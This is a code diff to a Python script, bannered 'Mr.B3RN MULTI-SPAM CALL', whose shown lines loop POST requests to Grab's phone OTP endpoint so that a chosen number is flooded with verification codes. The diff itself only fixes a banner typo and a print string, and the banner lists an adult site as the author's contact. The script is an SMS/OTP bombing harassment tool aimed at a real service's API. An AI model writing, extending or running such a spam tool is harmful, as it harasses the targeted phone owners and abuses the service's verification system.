@@ -23,7 +23,7 @@ print("""%s
 		         Mr.B3RN MULTI-SPAM CALL%s
  ,_     _‚
  |\\\___//|	%sAuthor: Mr.B3RN%s
- | =👁️ 👁️= |	%sContactContact: https://xhamster.com%s
+ | =👁️ 👁️= |	%sContact: https://xhamster.com%s
  \=._Y_.=/	%sGithub: https://github.com/MRram0s%s
   )  `  (    ,	%sTEAM: TOK MUNG SQUARE%s
  /       \  ((
@@ -49,7 +49,7 @@ try:
 	print()
 	print("%s[-] RESULT:%s"%(r,w))
 	for i in range(jlmh):
-		print("[!] PLEASE WAIT...")
+		print("[!] PLEASE WAIT...%s")
 		idk=("challengeID")
 		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
 		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
